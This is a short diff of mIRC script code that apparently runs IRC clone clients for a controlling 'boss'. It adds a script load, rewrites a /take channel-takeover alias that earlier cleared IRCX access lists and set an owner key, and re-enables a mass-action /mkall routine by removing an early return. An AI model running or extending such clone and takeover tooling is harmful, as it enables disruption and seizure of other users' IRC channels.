@@ -4,6 +4,7 @@ load.rest {
   load -rs script1.mrc
   load -rs script2.mrc
   load -rs unmask.mrc
+  load -rs spell.mrc
   msg %boss Reload Complete
   halt
 }
@@ -155,7 +156,7 @@ report {
   mode $2 +h $1
   return
 }
-/take { return | ;raw access # clear $+ $cr $+ access # add host *!*@*  | /mkall # | /prop # ownerkey tester }
+/take { mkall # }
 info return StrangeServer
 mybar { titlebar - $chr(91) Clone $mid($nopath($mircini),4,2) ] $chr(91) nick: $me $chr(93) $chr(91) lag: %Lag.mrc $chr(93) $chr(91) IRCX: %IRCX.mode $chr(93) $chr(91) $server $chr(93) }
 /join { jn $1 $2 $3 $4 $5 $6- }
@@ -223,7 +224,6 @@ mybar { titlebar - $chr(91) Clone $mid($nopath($mircini),4,2) ] $chr(91) nick: $
   return
 }
 /mkall {
-  return
   var %mass2
   var %mass 0
   :incl
